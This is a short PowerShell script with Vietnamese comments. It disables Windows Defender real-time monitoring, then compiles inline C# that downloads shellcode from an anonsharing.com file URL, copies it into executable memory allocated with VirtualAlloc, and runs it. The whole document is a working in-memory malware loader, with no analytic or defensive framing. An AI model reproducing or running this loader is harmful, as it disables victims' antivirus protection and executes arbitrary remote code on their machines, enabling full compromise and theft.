Set-MpPreference -DisableRealtimeMonitoring $true

function freefire {
    $freefirethegreat = @"
    using System;
    using System.Net;
    using System.Runtime.InteropServices;

    public class freefirethegreat {
        // Import hàm VirtualAlloc từ kernel32.dll
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr address, uint dwSize, uint allocType, uint mode);
        
        // Đại diện hàm cho shellcode
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void MemLoader();

        public static void Main() {
            // Thiết lập giao thức bảo mật
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            // URL của shellcode
            string url = "https://anonsharing.com/file/51e559e574f3fa26/shellcode_(2).bin";
            byte[] golangshc;
            // Tải shellcode từ URL
            using (WebClient client = new WebClient()) {
                golangshc = client.DownloadData(url);
            }

            // Phân bổ bộ nhớ cho shellcode
            IntPtr chainski = VirtualAlloc(IntPtr.Zero, Convert.ToUInt32(golangshc.Length), 0x1000, 0x40);
            // Sao chép shellcode vào bộ nhớ đã phân bổ
            Marshal.Copy(golangshc, 0x0, chainski, golangshc.Length);
            // Tạo đại diện hàm cho shellcode
            MemLoader kdot = Marshal.GetDelegateForFunctionPointer<MemLoader>(chainski);
            // Thực thi shellcode
            kdot();
        }
    }
"@
    # Biên dịch và thêm loại mới từ mã C#
    Add-Type $freefirethegreat
    # Gọi phương thức Main để thực thi shellcode
    [freefirethegreat]::Main()
}

# Gọi hàm freefire
freefire
